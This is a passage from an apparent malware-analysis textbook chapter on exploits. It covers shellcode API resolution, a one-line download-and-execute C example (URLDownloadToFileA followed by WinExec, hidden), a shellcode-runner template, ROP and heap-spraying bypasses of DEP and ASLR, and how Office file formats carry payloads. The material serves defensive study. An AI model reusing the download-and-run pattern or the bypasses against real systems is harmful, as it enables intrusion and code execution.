			<p>To handle <a id="_idIndexMarker1185"/>this issue, Windows created a third array named <code>AddressOfNameOrdinals</code>. This array has the same alignment as <code>AddressOfNames</code> and contains the index of every item in <code>AddressOfFunctions</code>. Note that <code>AddressOfFunctions</code> and <code>AddressOfNameOrdinals</code> have more items than <code>AddressOfNames</code> since not all APIs have names. The APIs without equivalent names are accessed using their ID (their index, in <code>AddressOfNameOrdinals</code>). The export table will look something like this:</p>
			<div><div><img src="img/Figure_8.7_B18500.jpg" alt="Figure 8.7 – Export table parser (the winSRDF project)&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.7 – Export table pa<a id="_idTextAnchor870"/>rser (the winSRDF project)</p>
			<p>For the shellcode to get the addresses of its required APIs, it should search for the required API’s name in <code>AddressOfNames</code> and then take the index of it and search for that index in <code>AddressOfNameOrdinals</code> to find the equivalent index of this API in <code>AddressOfFunctions</code>. By doing this, it will be able to get the relative address of that API. The shellcode <a id="_idIndexMarker1186"/>adds them to the base address of <code>kernel32.<a id="_idTextAnchor871"/>dll</code> so that it has the full address to this API. In most cases, instead of matching the API names against strings that it would need to hardcode within itself, the shellcode generally uses its hashes (more information can be found in <a href="B18500_06.xhtml#_idTextAnchor554"><em class="italic">Chapter 6</em></a>, <em class="italic">Bypassing Anti-Rever<a id="_idTextAnchor872"/>se Engineering Techniques</em>).</p>
			<h3>The download and execute shellcode</h3>
			<p>This shellcode <a id="_idIndexMarker1187"/>uses an API located in <code>urlmon.dll</code> <a id="_idIndexMarker1188"/>called <code>URLDownloadToFileA</code>. As its name suggests, it downloads a file from a given URL and saves it to the hard disk when it’s provided with the required path. The definition of this API is as follows:</p>
			<pre class="source-code">
URLDownloadToFile(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, _Reserved_ DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);</pre>
			<p>Only <code>szURL</code> and <code>szFilename</code> are required. The remaining arguments are mostly set to null. After the file is downloaded, the shellcode executes this file using <code>CreateProcessA</code>, <code>WinExec</code>, or <code>ShellExecute</code>. The C code for this may look as follows:</p>
			<pre class="source-code">
URLDownloadToFileA(0,"https://localhost:4444/calc.exe","calc.exe",0,0); WinExec("calc.exe",SW_HIDE);</pre>
			<p>As you can see, the <a id="_idIndexMarker1189"/>payload is very simple and yet very effective <a id="_idIndexMarker1190"/>in executing the second stage of the attack, which could be the backdoor tha<a id="_idTextAnchor873"/>t maintains persistence and can communicate to the attacker and e<a id="_idTextAnchor874"/>xfiltrate valuable information.</p>
			<h2 id="_idParaDest-273"><a id="_idTextAnchor875"/>Static and dynamic analysis of exploits</h2>
			<p>Now that we have learned about what exploits look like and how they work, let’s summarize some practical tips<a id="_idTextAnchor876"/><a id="_idTextAnchor877"/> and tricks for their analysis.</p>
			<h3>Analysis workflow</h3>
			<p>Firstly, you need to <a id="_idIndexMarker1191"/>carefully collect any prior knowledge: what environment the exploit was found in, whether it is already known what software was targeted and its version, and whether the exploit triggered successfully there. All this information will allow you to properly emulate the testing environment and successfully reproduce the expected behavior, which is very helpful for dynamic analysis.</p>
			<p>Secondly, it is important to confirm how it interacts with the targeted application. Usually, exploits are delivered through the expected input channel (whether it is a listening socket, a web form or URI, or maybe a malformed document, a configuration file, or a JavaScript script), but other overlooked options are also possible (for example, environment variables and dependency modules). The next step here is to use this information to successfully reproduce the exploitation process and identify the indicators that can confirm it. Examples include the target application crashing in a particular way or performing particular actions that can be seen using suitable system monitors (for example, the ones that keep track of file, registry, or network operations or accessed APIs). If shellcode is involved, its analysis may give valuable information about the expected after-exploitation behavior. </p>
			<p>After this, you need to identify the targeted vulnerability. The MITRE Corporation maintains a list of all publicly known vulnerabilities by assigning the corresponding <strong class="bold">Common Vulnerabilities and Exposures</strong> (<strong class="bold">CVE</strong>) identifiers to them so that they can easily be <a id="_idIndexMarker1192"/>referenced (for example, CVE-2018-9206). Sometimes, it may be already known from antivirus detection or publications, but it is always advisable to confirm it in any case.</p>
			<p>Check for unique strings first as they may give you a clue about the parts of the targeted software it interacts with. Unlike most other types of malware, static analysis may not be enough in this case. Since exploits work closely with the targeted software, they should be analyzed in their context, which in many cases requires dynamic analysis.</p>
			<p>Here, you need to intercept the moment the exploit is delivered but hasn’t been processed yet using <a id="_idIndexMarker1193"/>a debugger of preference. After this, there are multiple ways the analysis can be continued. One approach is to carefully go through the functions that are responsible for it being processed at a high level (without stepping into each function) and monitor the moment when it triggers. Once this happens, it becomes possible to narrow down the searching area and focus on the sub-functions of the identified function. Then, the engineer can repeat this process up <a id="_idTextAnchor878"/>until the moment the bug is found.</p>
			<p>Another way to do this is to search for suspicious entries in the exploit itself first (such as corrupted fields, big binary blocks with high entropy, long lines with hex symbols, and so on) and monitor how the targeted software processes them. If shellcode is involved, it is possible to patch it with either breakpoint or infinite loop instructions at its beginning <code>(\xCC</code> and <code>\xEB\xFE</code>, respectively), then perform steps to reproduce the exploitation, wait until the inserted instructions get executed, and check the stack trace to see what functions have been called to reach this point.</p>
			<p>Overall, it is generally recommended to stick to the virtualized environment or emulation for dynamic analysis since in the case of exploits, it is much more probable that something may go wrong, and execution control will be lost. Therefore, it is convenient to be able to restore the previous debugging and environmental state.</p>
			<p>These techniques are universal and can be applied to pretty much any type of exploit. Regardless of <a id="_idIndexMarker1194"/>whether the engineer has to analyze browser exploits (often written in JavaScript) or some local privilege escalation code, t<a id="_idTextAnchor879"/>he difference will mainly be in the<a id="_idTextAnchor880"/> setup for the testing environment.</p>
			<h3>Shellcode analysis</h3>
			<p>If you need to <a id="_idIndexMarker1195"/>analyze the binary shellcode, you can use a debugger for the targeted architecture and platform (such as OllyDbg for 32-bit Windows) by copying the hexadecimal representation of the shellcode and using the binary <a id="_idIndexMarker1196"/>paste option. It is <a id="_idIndexMarker1197"/>also possible to use tools such as <strong class="bold">unicorn</strong>, <strong class="bold">libemu</strong> (a small emulator library for x86 instructions), or the <strong class="bold">Pokas x86 Emulator</strong>, which is a <a id="_idIndexMarker1198"/>part of the <strong class="bold">pySRDF</strong> project, to emulate shellcode. Other great <a id="_idIndexMarker1199"/>tools useful <a id="_idIndexMarker1200"/>for dynamic analysis are <strong class="bold">scdbg</strong> and <strong class="bold">qltool</strong> (part of the <strong class="bold">qiling</strong> framework).</p>
			<p>Another popular solution is to convert it into an executable file. After this, you can analyze it both statically and dynamically, just like any usual malware sample. One option would be to use the <code>shellcode2exe.py</code> script, but unfortunately, one of its core dependencies is no longer supported, so it may be hard to set it up. Another option would be to compile the executable manually by copying and pasting the shellcode into the corresponding template:</p>
			<pre class="source-code">
unsigned char code[] = {&lt;output of xxd –i against the shellcode&gt;};
int main(int argc, char **argv)
{
        int (*func)();
        func = (int (*)()) code;
        (int)(*func)();
}</pre>
			<p>The execution flag may need to be added to the data section to make the shellcode executable.</p>
			<p>Finally, it is possible to just open any executable in the debugger and copy and paste the shellcode over the <a id="_idIndexMarker1201"/>existing code. For example, in x64dbg, it can be done by right-clicking and going to <strong class="bold">Binary</strong> | <strong class="bold">Paste (Ignore Size)</strong>.</p>
			<p>For the ROP chain to be analyzed, you need to get access to the targeted app<a id="_idTextAnchor881"/>lication and the system so that the actual instr<a id="_idTextAnchor882"/>uctions can be resolved dynamically there.</p>
			<h1 id="_idParaDest-274"><a id="_idTextAnchor883"/>Exploring bypasses for exploit mitigation technologies</h1>
			<p>Since the same <a id="_idIndexMarker1202"/>types of vulnerabilities kept appearing, despite all the awareness and training for software developers on secure coding, new ways to reduce their impact and make them unusable for <a id="_idTextAnchor884"/>remote code execution have been introduced.</p>
			<p>In particular, multiple exploit mitigation technologies were developed at various levels to make it hard to impossible for the attackers to <a id="_idTextAnchor885"/>successfully execute their shellcode. Let’s take a look at the most well-known mitigatio<a id="_idTextAnchor886"/>ns that have been created for this purpose.</p>
			<h2 id="_idParaDest-275"><a id="_idTextAnchor887"/>Data execution prevention (DEP/NX)</h2>
			<p>Data execution prevention is one of the earliest techniques that was introduced to protect against <a id="_idIndexMarker1203"/>exploits and shellcode. The idea behind it is to stop the execution inside any memory page that <a id="_idIndexMarker1204"/>doesn’t have <code>EXECUTE</code> permission. This technique can be supported by hardware that raises an exception once shellcode gets executed in the stack or in the heap (or any place in memory that doesn’t have this permission).</p>
			<p>This technology didn’t completely stop the attackers from executing their payload and taking advantage <a id="_idIndexMarker1205"/>of memory corruption vul<a id="_idTextAnchor888"/>nerabilities. They invented a new technique to bypass DE<a id="_idTextAnchor889"/>P/NX called <strong class="bold">return-oriented programming</strong> (<strong class="bold">ROP</strong>).</p>
			<h2 id="_idParaDest-276"><a id="_idTextAnchor890"/>Return-oriented programming</h2>
			<p>The main idea <a id="_idIndexMarker1206"/>behind ROP is that rather than setting the <a id="_idIndexMarker1207"/>return address so that it points to the shellcode, attackers can set the return address to redirect the execution to some existing code inside the program or any of its modules and chain instructions to reproduce a shellcode. The small snippets of misused code will look like this:</p>
			<pre>mov eax, 1
pop ebx
ret</pre>
			<p>For example, on Windows, the attacker can try to redirect the execution to the <code>VirtualProtect</code> API to change permissions for the part of the stack (or heap) that the shellcode is in and execute the shellcode. Alternatively, it is possible to use combinations such as <code>VirtualAlloc</code> and <code>memcpy</code> or <code>WriteProcessMemory</code>, <code>HeapAlloc</code> and any memory copy API, or the <code>SetProcessDEPPolicy</code> <a id="_idTextAnchor891"/>and <code>NtSetInformationProcess</code> APIs to disable DEP.</p>
			<p>The trick here is to use the <strong class="bold">Import Address Table</strong> (<strong class="bold">IAT</strong>) of a module to get the address of any <a id="_idIndexMarker1208"/>of these APIs so that the attacker can redirect the execution to the beginning of this API. In the ROP chain, the attacker places all the arguments that are required for each of these APIs, followed by a return to the API they want to execute. An example of this is as follows:</p>
			<div><div><img src="img/Figure_8.8_B18500.jpg" alt="Figure 8.8 – The ROP chain for the CVE-2018-6892 exploit&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.8 – The ROP chain for the CVE-2018-6892 exploit</p>
			<p>Some ROP chains can execute the required payload without the need to return to the shellcode. There <a id="_idIndexMarker1209"/>are automated tools that help the attacker <a id="_idIndexMarker1210"/>search for these small code gadgets and construct the valid ROP chain. One of these tools is <code>mona.py</code>, which is a plugin for the Immunity Debugger.</p>
			<p>As you can see, DEP alone doesn’t stop the attackers from executing their shellcode. However, along with <strong class="bold">address space layout randomization</strong> (<strong class="bold">ASLR</strong>), these two mitigation <a id="_idIndexMarker1211"/>techniques make it hard for the attacker to successfully execut<a id="_idTextAnchor892"/><a id="_idTextAnchor893"/><a id="_idTextAnchor894"/>e the payload. Let’s take a look at how ASLR works.</p>
			<h2 id="_idParaDest-277"><a id="_idTextAnchor895"/>Address space layout randomization</h2>
			<p>ASLR is a mitigation <a id="_idIndexMarker1212"/>technique that is used by multiple operating systems, including Windows <a id="_idIndexMarker1213"/>and Linux. The idea behind it is to randomize addresses where the application and the DLLs are loaded in the process memory. Instead of using predefined <code>ImageBase</code> values as base addresses, the system uses random addresses to make it very hard for the attackers to construct their ROP chains, which generally rely on t<a id="_idTextAnchor896"/>he static addresses of instructions that comprise it.</p>
			<p>Now<a id="_idTextAnchor897"/>, let’s take a look at some common ways to bypass it.</p>
			<h3>DEP and partial ASLR</h3>
			<p>For ASLR to be effective, it is required to have the application and all its libraries compiled with <a id="_idIndexMarker1214"/>an ASLR enabling flag, such as <code>-fstack-protector</code> or <code>-pie -fPIE</code> for the GCC compiler, which isn’t always possible. If there is at least one module that doesn’t support ASLR, it becomes possible for the attacker to find the required ROP gadgets there. This is especially true for tools that have lots of plugins written by third parties or applications that use lots of different libraries. While the base address of <code>kernel32.dll</code> is still randomized (so that the attacker can’t directly return to an <a id="_idTextAnchor898"/>API inside), it can easily be accessed f<a id="_idTextAnchor899"/>rom the import table of the loaded non-ASLR module(s).</p>
			<h3>DEP and full ASLR – partial ROP and chaining multiple vulnerabilities</h3>
			<p>In cases where all the libraries support ASLR, writing an exploit is much harder. The known technique <a id="_idIndexMarker1215"/>for this is <a id="_idIndexMarker1216"/>chaining multiple vulnerabilities. For example, one <a id="_idIndexMarker1217"/>vulnerability will be responsible for information disclosure and another for memory corruption. The information disclosure vulnerability could leak an address of a module that helps reconstruct the ROP chain based on that address. The exploit could contain an ROP chain comprised of just RVAs (relative addresses without the base address values) and exploit the information disclosure vulnerability on the fly to leak the address and reconstruct the ROP chain to execute the shellcode. This type of exploit is more common in scripting languages, for example, targeting vulnerabilities that are exploited using JavaScript. Using the power of this scripting language, the at<a id="_idTextAnchor900"/>tacker can construct the ROP chain on the target machine.</p>
			<p>An example of this could be the local privilege escalation vulnerability known as <em class="italic">CVE-2019-0859</em> in <code>win32k.sys</code>. The attacker uses a known technique for modern versions of Windows (this works on Windows 7, 8, and 10) called the <code>HMValidateHandle</code> technique. It uses an <code>HMValidateHandle</code> function that’s called by <a id="_idIndexMarker1218"/>the <code>IsMenu</code> API, which is <a id="_idIndexMarker1219"/>implemented in <code>user32.dll</code>. Given a handle of a <a id="_idIndexMarker1220"/>window that has been created, this function returns the address of its memory object in the kernel memory, resulting in an information disclosure that could help in designing the exploit, as shown in the following screenshot:</p>
			<div><div><img src="img/Figure_8.9_B18500.jpg" alt="Figure 8.9 – Kernel memory address leak using the HMValidateHandle technique&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.9 – Kernel memory address leak using the HMValidateHandle technique</p>
			<p>This technique works pretty well with stack-based overflow vulnerabilities. But for heap overflows or use-after-free, a new problem arises, which is that the location of the shellcode in the memory is unknown. In stack-based overflows, the shellcode resides in the stack, and it’s pointed to by the <code>esp</code> register, but in heap overflows, it is harder to predict where the <a id="_idIndexMarker1221"/>shellcode will be. In this ca<a id="_idTextAnchor901"/><a id="_idTextAnchor902"/><a id="_idTextAnchor903"/>se, another technique called <strong class="bold">heap spraying</strong> is commonly used.</p>
			<h3>Full ASLR – the heap spraying technique</h3>
			<p>The idea behind this technique is to make multiple addresses lead to the shellcode by filling the <a id="_idIndexMarker1222"/>memory of the application with <a id="_idIndexMarker1223"/>lots of copies of it, which will lead to it being executed with a very high probability. The main problem here is guaranteeing that these addresses point to the start of it and not to the middle. This can be achieved by using some sort of <a id="_idIndexMarker1224"/>shellcode <a id="_idIndexMarker1225"/>padding. The most famous example involves <a id="_idIndexMarker1226"/>having a huge amount of <code>nop</code> bytes (called <strong class="bold">nop slide</strong>, <strong class="bold">nop sled</strong>, or <strong class="bold">nop ramp</strong>), or any instructions that don’t have any major effect before the shellcode:</p>
			<div><div><img src="img/Figure_8.10_B18500.jpg" alt="Figure 8.10 – The heap spray technique&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.10 – The heap spray technique</p>
			<p>As you can see, the attacker used the <code>0x0a0a0a0a</code> address to point to its shellcode. Because of the heap spraying technique, this address, which has a relatively high probability, may point to the <code>nop</code> instructions in one of the shellcode blocks, which will later lead to the shellcode starting.</p>
			<h3>DEP and full ASLR – JIT spraying</h3>
			<p>This technique is very similar to heap spraying, with the only difference being that block allocation is <a id="_idIndexMarker1227"/>caused by abusing a <code>EXECUTE</code> permissions as they are supposed to store generated assembl<a id="_idTextAnchor904"/><a id="_idTextAnchor905"/><a id="_idTextAnchor906"/>y <a id="_idIndexMarker1228"/>instructions. This way, DEP can be bypassed together with ASLR.</p>
			<h2 id="_idParaDest-278"><a id="_idTextAnchor907"/>Other mitigation technologies</h2>
			<p>Several other mitigation techniques have been introduced to protect against exploitation. We will just mention a few of them:</p>
			<ul>
				<li><code>ret</code> instruction. This technique makes it harder for the attackers to use stack overflow vulnerabilities to modify the return address as this value is unknown to them. However, there are multiple bypasses for it, and one of them is overwriting the SEH address and forcing an exception to happen before the GS cookie is checked. Overwriting the SEH address is very effective and led to other mitigations being introduced for it.</li>
				<li><strong class="bold">Structured Exception Handling Overwrite Protection</strong> (<strong class="bold">SEHOP</strong>): This mitigation <a id="_idIndexMarker1231"/>technique <a id="_idIndexMarker1232"/>performs additional security checks to make sure that the SEH chain hasn’t been corrupted.</li>
				<li><strong class="bold">SafeSEH</strong>: This <a id="_idIndexMarker1233"/>mitigation directly protects <a id="_idIndexMarker1234"/>the applications from memory corruptions that overwrite SEH addresses. In this case, the SEH addresses are no longer stored in the stack and instead are referenced in the PE header in a separate data directory <a id="_idTextAnchor908"/>that includes all the SEH addresses for all the application’s functions.</li>
			</ul>
			<p>That’s it for the<a id="_idTextAnchor909"/> most common mitigations. Now, let’s talk about other types of exploits.</p>
			<h1 id="_idParaDest-279"><a id="_idTextAnchor910"/>Analyzing Microsoft Office exploits</h1>
			<p>While Microsoft Office is mainly associated with Windows by many people, it has also supported the <a id="_idIndexMarker1235"/>macOS operating system for several decades. In addition, the file formats used by it are also understood by various other suites, such as Apache OpenOffice and LibreOffice. In this section, we will look at vulnerabilities that can be exploited by <a id="_idTextAnchor911"/>malfor<a id="_idTextAnchor912"/>med documents to perform malicious actions and learn how to analyze them.</p>
			<h2 id="_idParaDest-280"><a id="_idTextAnchor913"/>File structures</h2>
			<p>The first thing that <a id="_idIndexMarker1236"/>should be clear when analyzing any <a id="_idIndexMarker1237"/>exploit is how the files associated with them are structured. Let’s take a look at the most common file formats associated with Micro<a id="_idTextAnchor914"/><a id="_idTextAnchor915"/><a id="_idTextAnchor916"/>soft Office that are used by attackers to store and execute malicious code.</p>
			<h3>Compound file binary format</h3>
			<p>This is probably <a id="_idIndexMarker1238"/>the most well-known file format <a id="_idIndexMarker1239"/>that can be found in documents associated with various older and newer Microsoft Office products, such as <code>.doc</code> (Microsoft Word), <code>.xls</code> (Microsoft Excel), <code>.ppt</code> (Microsoft PowerPoint), and others. Once completely proprietary, it was later released to the public and now, its specification can be found online. Let’s go through some of the most important parts of it in terms of malware analysis.</p>
			<p>The <strong class="bold">Compound File Binary</strong> (<strong class="bold">CFB</strong>) format, also <a id="_idIndexMarker1240"/>known as <strong class="bold">OLE2</strong>, provides a filesystem-like structure for storing application-specific streams of data in sectors:</p>
			<div><div><img src="img/Figure_8.11_B18500.jpg" alt="Figure 8.11 – OLE2 header parsed&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.11 – OLE2 header parsed</p>
			<p>Here is the structure <a id="_idIndexMarker1241"/>of its header, which is stored at the <a id="_idIndexMarker1242"/>beginning of the first <a id="_idIndexMarker1243"/>sector:</p>
			<ul>
				<li><code>\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1</code> (where the first 4 bytes in hex format resemble a <code>DOCFILE</code> string)</li>
				<li><strong class="bold">Header CLSID</strong> (<strong class="bold">16 bytes</strong>): Unused class ID; must be zero</li>
				<li><strong class="bold">Minor version</strong> (<strong class="bold">2 bytes</strong>): Always 0x003E for major versions 3 and 4 of this format</li>
				<li><strong class="bold">Major version</strong> (<strong class="bold">2 bytes</strong>): Main version number, can be either 0x0003 or 0x0004</li>
				<li><strong class="bold">Byte order</strong> (<strong class="bold">2 bytes</strong>): Always 0xFFFE and represents little-endian order </li>
				<li><strong class="bold">Sector shift</strong> (<strong class="bold">2 bytes</strong>): The sector size as a power of 2, 0x0009 for major version 3 (2^9 = 512 bytes) or 0x000C for major version 4 (2^12 = 4,096 bytes)</li>
				<li><strong class="bold">Mini sector shift</strong> (<strong class="bold">2 bytes</strong>): Always 0x0006 and represents the sector size of the mini stream (2^6 = 64 bytes)</li>
				<li><strong class="bold">Reserved</strong> (<strong class="bold">6 bytes</strong>): Must be set to zero</li>
				<li><strong class="bold">Number of directory sectors</strong> (<strong class="bold">4 bytes</strong>): Represents the number of <strong class="bold">Directory</strong> sectors, always zero for major version 3 (not supported)</li>
				<li><strong class="bold">Number of FAT sectors</strong> (<strong class="bold">4 bytes</strong>): Number of FAT sectors</li>
				<li><strong class="bold">First directory sector location</strong> (<strong class="bold">4 bytes</strong>): Represents the starting sector number for the directory stream</li>
				<li><strong class="bold">Transaction signature number</strong> (<strong class="bold">4 bytes</strong>): Stores a sequence number for the transactions <a id="_idIndexMarker1244"/>in <a id="_idIndexMarker1245"/>files<a id="_idIndexMarker1246"/> supporting them or zero otherwise</li>
				<li><strong class="bold">Mini stream cutoff size</strong> (<strong class="bold">4 bytes</strong>): Always 0x00001000, this represents the maximum size of the user-defined data stream associated with the MiniFAT data </li>
				<li><strong class="bold">First MiniFAT sector location</strong> (<strong class="bold">4 bytes</strong>): Stores the starting sector number for the MiniFAT se<a id="_idTextAnchor917"/>ctors</li>
				<li><strong class="bold">Number of MiniFAT sectors</strong> (<strong class="bold">4 bytes</strong>): Is used to store several MiniFAT sectors</li>
				<li><strong class="bold">First DIFAT sector location</strong> (<strong class="bold">4 bytes</strong>): Starting sector number for the DIFAT data</li>
				<li><strong class="bold">Number of DIFAT sectors</strong> (<strong class="bold">4 bytes</strong>): Stores several DIFAT sectors</li>
				<li><strong class="bold">DIFAT</strong> (<strong class="bold">436 bytes</strong>): An array of integers (4 bytes each) representing the first 109 locations of FAT sectors:</li>
			</ul>
			<div><div><img src="img/Figure_8.12_B18500.jpg" alt="Figure 8.12 – DIFAT array mentioning only one FAT sector with an ID of 0x2D&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.12 – DIFAT array mentioning only one FAT sector with an ID of 0x2D</p>
			<p>As you <a id="_idIndexMarker1247"/>can see, it <a id="_idIndexMarker1248"/>is possible to allocate memory using the usual sectors and mini stream that operates <a id="_idIndexMarker1249"/>with sectors of smaller sizes:</p>
			<ul>
				<li><strong class="bold">File Allocation Table</strong> (<strong class="bold">FAT</strong>): This is the main space allocator. Each stream is represented by <a id="_idIndexMarker1250"/>a sector chain, where each entry contains the ID of the next sector up <a id="_idIndexMarker1251"/>until the chain terminator. This chain information is stored in dedicated <strong class="bold">FAT sectors</strong>:</li>
			</ul>
			<div><div><img src="img/Figure_8.13_B18500.jpg" alt="Figure 8.13 – FAT sector storing information about sector chains&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.13 – FAT sector storing information about sector chains</p>
			<ul>
				<li><strong class="bold">MiniFAT</strong>: This is the <a id="_idIndexMarker1252"/>allocator for the mini stream and small user-defined data:</li>
			</ul>
			<div><div><img src="img/Figure_8.14_B18500.jpg" alt="Figure 8.14 – MiniFAT sectors storing information about mini stream chains&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.14 – MiniFAT sectors storing information about mini stream chains</p>
			<p>As we <a id="_idIndexMarker1253"/>mentioned <a id="_idIndexMarker1254"/>previously, for <a id="_idIndexMarker1255"/>each sector in a chain, the ID of the next sector is stored up until the last one that contains the <code>ENDOFCHAIN</code> (<code>0xFFFFFFFE</code>) value, and the header takes up a single usual sector with its values padded according to the sector’s size if necessary:</p>
			<div><div><img src="img/Figure_8.15_B18500.jpg" alt="Figure 8.15 – Example of the sector chain following the header&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.15 – Example of the sector chain following the header</p>
			<p>There are <a id="_idIndexMarker1256"/>several <a id="_idIndexMarker1257"/>other auxiliary storage types, including the following:</p>
			<ul>
				<li><strong class="bold">Double-Indirect File Allocation Table</strong> (<strong class="bold">DIFAT</strong>): Stores <a id="_idIndexMarker1258"/>the locations of FAT sectors (explained previously)</li>
				<li><strong class="bold">Directory</strong>: Stores metadata for storage and stream objects</li>
			</ul>
			<p>Here, stream and storage objects are used in a similar way to files and directories in typical filesystems:</p>
			<div><div><img src="img/Figure_8.16_B18500.jpg" alt="Figure 8.16 – Multiple streams within a single storage object&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.16 – Multiple streams within a single storage object</p>
			<p>The root directory will <a id="_idTextAnchor918"/>be <a id="_idIndexMarker1259"/>the first entry in the first sector of the directory chain; it behaves as both a stream and a storage object. It contains a pointer to the first sector that stores the mini stream:</p>
			<div><div><img src="img/Figure_8.17_B18500.jpg" alt="Figure 8.17 – Root directory&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.17 – Root directory</p>
			<p>In <code>.xls</code> files, the main <code>Workbook</code> stream follows the <code>.doc</code> files, the <code>WordDocument</code> stream should start with the <strong class="bold">FIB</strong> structure.</p>
			<p>Knowing how <a id="_idIndexMarker1260"/>the files<a id="_idIndexMarker1261"/> are structured allows reverse engineers to identify anomalies<a id="_idTextAnchor919"/> that can lead to unexpected behavior.</p>
			<p>Now, let’s focus on <strong class="bold">Rich Text Format</strong> (<strong class="bold">RTF</strong>) documents.</p>
			<h3>Rich Text Format</h3>
			<p>RTF is another <a id="_idIndexMarker1262"/>proprietary Microsoft format with a published <a id="_idIndexMarker1263"/>specification that can be used to create documents. Originally, its syntax was influenced by the <strong class="bold">TeX</strong> language, which was mostly developed by Donald Knuth as it was intended to be cross-platform. The first reader and writer were released with the Microsoft Word product for Macintosh computers. Unlike the other document formats we<a id="_idTextAnchor920"/>’ve described, it is human-readable in usual text editors, without any preprocessing required.</p>
			<p>Apart from the <a id="_idIndexMarker1264"/>actual text, all RTF documents are implemented using the following elements:</p>
			<ul>
				<li><code>\rtfN</code>: The starting control word that can be found at the beginning of any RTF document, where <code>N</code> represents the major format version (currently, this is 1). </li></ul></li>
			</ul>
			<p class="callout-heading">Important Note</p>
			<p class="callout">It is worth mentioning that if the <code>fN</code> part of it is not enforced, the RTF document will be considered valid by MS Office, even if it is absent or replaced with something else.</p>
			<ul>
				<li><code>\ansi</code>: One of the supported character sets that follows <code>\rtfN</code>.</li>
				<li><code>\fonttbl</code>: The control word for introducing the font table group.</li>
				<li><code>\pard</code>: Resets to the default paragraph properties.</li>
				<li><code>\par</code>: Specifies the new paragraph (or the end of the current paragraph).</li>
			</ul>
			<ul>
				<li><strong class="bold">Delimiters</strong>: Marks the <a id="_idIndexMarker1265"/>end of an RTF control word. There are three <a id="_idIndexMarker1266"/>types of delimiters in total:<ul><li><strong class="bold">Spaces</strong>: Treated as part of the control word</li><li><strong class="bold">Non-alphanumeric symbols</strong>: Terminates the control word, but is not part of it</li><li><strong class="bold">A digit with an optional hyphen (to specify minus)</strong>: Indicates the numeric <a id="_idIndexMarker1267"/>parameter; either positive or negative</li></ul></li>
				<li><strong class="bold">Control symbols</strong>: These symbols include a backslash, followed by a non-alphabetic character. These <a id="_idIndexMarker1268"/>are treated in the same way as con<a id="_idTextAnchor921"/>trol words.</li>
				<li><strong class="bold">Groups</strong>: Groups consist of text and control words or symbols that specify the associated attributes, all surrounded by curly brackets.</li>
			</ul>
			<p>The embedded <a id="_idIndexMarker1269"/>executable payloads are commonly stored in the <a id="_idIndexMarker1270"/>following areas:</p>
			<ul>
				<li>The <code>\objdata</code> argument of the <code>\object</code> control word. The data can be of various data formats and specified using the <code>\objclass</code> control word. The following are some example formats:<ul><li>OLE2 (for example, Word.Document.8)</li><li>OOXML</li><li>PDF</li></ul></li>
				<li>The <code>\datastore</code> block’s content.</li>
				<li>The document’s overlay (the area after the markdown):</li>
			</ul>
			<div><div><img src="img/Figure_8.18_B18500.jpg" alt="Figure 8.18 – Malicious executable stored in the document’s overlay&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.18 – Malicious executable stored in the document’s overlay</p>
			<p>Apart from that, the remote malicious payload can be accessed using the <code>\objautlink</code> control <a id="_idIndexMarker1271"/>word. In addition, <code>\objupdate</code> is <a id="_idIndexMarker1272"/>commonly used to reload the object without the user’s interaction to achieve code execution.</p>
			<p>In terms of obfuscation, multiple techniques exist for this, as follows:</p>
			<ul>
				<li>Inserting <code>{\object}</code> entries in the middle of the data</li>
				<li>Inserting multiple excessive <code>\bin[num]</code> entries</li>
				<li>Adding spaces between digits in the objects’ data:</li>
			</ul>
			<div><div><img src="img/Figure_8.19_B18500.jpg" alt="Figure 8.19 – Malware using excessive \bin control words&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.19 – Malware using exces<a id="_idTextAnchor922"/>sive \bin control words</p>
			<p>Now, let’s talk about threats that follow the <strong class="bold">Office Open XML</strong> (<strong class="bold">OOXML</strong>) format.</p>
			<h3>Office Open XML format</h3>
			<p>OOXML format is <a id="_idIndexMarker1273"/>associated with newer Microsoft Office <a id="_idIndexMarker1274"/>products and is implemented in files with extensions that end with <em class="italic">x</em>, such as <code>.docx</code>, <a id="_idTextAnchor923"/><code>.xlsx</code>, and <code>.pptx</code>. At the time of writing, this is the default format used by modern versions of Office.</p>
			<p>In this case, all information is stored in <strong class="bold">Open Packaging Convention</strong> (<strong class="bold">OPC</strong>) packages, which <a id="_idIndexMarker1275"/>are ZIP archives that follow a particular structure and store XML and other data, as well as the relationships between them.</p>
			<p>Here is its basic structure:</p>
			<ul>
				<li><code>[Content_Types].xml</code>: This file can be found in any document and stores MIME-type information for various parts of the package.</li>
				<li><code>_rels</code>: This directory contains relationships between files within the package. All files that have relationships will have a file here with the same name and a <code>.rels</code> extension appended to it. In addition, it also contains a separate <code>.rels</code> XML file for storing package relationships.</li>
				<li><code>docProps</code>: This contains several XML files describing certain properties associated <a id="_idIndexMarker1276"/>with the document – for <a id="_idIndexMarker1277"/>example, <code>core.xml</code> for core properties (such as the creator or various dates) and <code>app.xml</code>  for the number of pages, characters, and so on.</li>
